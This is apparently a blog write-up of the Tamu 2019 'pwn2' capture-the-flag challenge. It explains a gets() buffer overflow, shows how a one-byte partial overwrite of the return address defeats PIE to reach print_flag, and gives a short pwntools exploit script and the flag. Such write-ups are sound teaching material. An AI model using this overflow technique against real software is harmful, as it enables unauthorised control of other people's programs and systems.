---
layout: post
title: Tamu 2019 pwn2
date: 2025-07-16 00:22:03 +0300
categories: Nightmare-series partial-overwrite
tags: nightmare buffer-overflow i386 partial-overwrite 
---

## Information
- Category: Pwn

## Description
> None

## Write-up

When we run the program, it takes user input. 
If we inspect it using Ghidra or IDA, we can see it uses `gets()`, which is dangerous due to its lack of bounds checking.

 However, our goal is to execute the `print_flag` function, and a simple buffer overflow to overwrite the return address won't work directly because the binary has **ASLR** and **PIE** enabled.

Instead, we can take advantage of how the `select_func` function works. 

It takes our input, copies it into a local variable, and is then called from `main`. This means the return address inside `select_func` will point back to `main` — specifically, to the instruction after the call to `select_func`. 

If we can partially overwrite the return address inside `select_func`, we can redirect execution to `print_flag`. 

Since PIE only randomizes the higher bits, and the **low byte of the return address is fixed** (`0xd8`), a **partial overwrite** is enough to hijack control flow. 
We know:
 - The offset to the return address inside `select_func` is `0x1e` 
 - The fixed **low byte** of `print_flag`'s address is `0xd8` 

 So, by sending input that overflows the buffer and **overwrites just the least-significant byte** of the return address, we can make the function return into `print_flag`, bypassing ASLR and PIE.

## Exploit
```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn2_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    payload = b"A"*0x1e + b"\xd8"
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
```

## Flag
> Flag:``` flag{g0ttem_b0yz}```
